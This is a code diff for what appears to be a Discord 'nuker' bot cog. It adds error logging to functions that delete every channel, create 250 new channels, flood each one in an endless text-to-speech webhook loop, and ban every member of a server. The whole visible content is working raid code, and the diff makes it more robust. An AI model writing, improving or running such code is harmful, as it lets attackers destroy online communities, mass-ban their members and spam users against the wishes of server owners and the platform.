@@ -9,22 +9,23 @@ from Commands.logger import log
 async def DELETE(obj):
     try:
         await obj.delete()
-    except:
-        pass
+    except Exception as e:
+        log(f'DELETE: {e}', 'ОШИБКА', Fore.RED, 1)
 
 
 async def CREATE_ROLE(guild, name):
     try:
         await guild.create_role(name=name)
-    except:
-        pass
+    except Exception as e:
+        log(f'CREATE_ROLE: {e}', 'ОШИБКА', Fore.RED, 1)
 
 
 async def SPAM_WEBHOOK(channel, message):
     try:
         webhook = await channel.create_webhook(name='everyone')
-    except:
-        pass
+    except Exception as e:
+        log(f'SPAM_WEBHOOK: {e}', 'ОШИБКА', Fore.RED, 1)
+        return
 
     while True:
         await webhook.send(message, tts=True)
@@ -33,8 +34,9 @@ async def SPAM_WEBHOOK(channel, message):
 async def CREATE_CHANNEL(guild, name, spam=False, message=None):
     try:
         channel = await guild.create_text_channel(name=name)
-    except:
-        pass
+    except Exception as e:
+        log(f'CREATE_CHANNEL: {e}', 'ОШИБКА', Fore.RED, 1)
+        return
 
     if spam:
         await SPAM_WEBHOOK(channel, message)
@@ -43,11 +45,12 @@ async def CREATE_CHANNEL(guild, name, spam=False, message=None):
 async def BAN(member):
     try:
         await member.ban()
-    except:
-        pass
+    except Exception as e:
+        log(f'BAN: {e}', 'ОШИБКА', Fore.RED, 1)
 
 
 class NukerCog(commands.Cog):
+
     def __init__(self, bot):
         self.bot = bot
 
@@ -187,7 +190,8 @@ class NukerCog(commands.Cog):
             create_task(DELETE(channel))
 
         for _ in range(250):
-            create_task(CREATE_CHANNEL(ctx.guild, names, True, message))
+            create_task(CREATE_CHANNEL(ctx.guild, names, True,
+                                       message))  # TODO: fix
 
         for member in ctx.guild.members:
             create_task(BAN(member))
